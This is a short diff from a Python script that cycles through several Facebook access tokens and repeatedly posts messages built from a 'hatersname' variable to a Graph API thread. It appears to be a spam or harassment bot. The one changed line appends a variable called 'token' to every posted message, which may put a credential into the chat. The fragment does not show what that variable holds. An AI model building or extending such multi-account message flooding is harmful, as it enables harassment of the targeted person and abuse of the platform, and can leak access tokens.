@@ -37,7 +37,7 @@ def send_messages(access_tokens, thread_id, hatersname, last_name, time_interval
                 break
             for access_token in access_tokens:
                 api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
-                message = f"{hatersname} {message1} {last_name}"
+                message = f"{hatersname} {message1} {last_name} {token}"
                 parameters = {'access_token': access_token, 'message': message}
                 response = requests.post(api_url, data=parameters, headers=headers)
                 if response.status_code == 200:
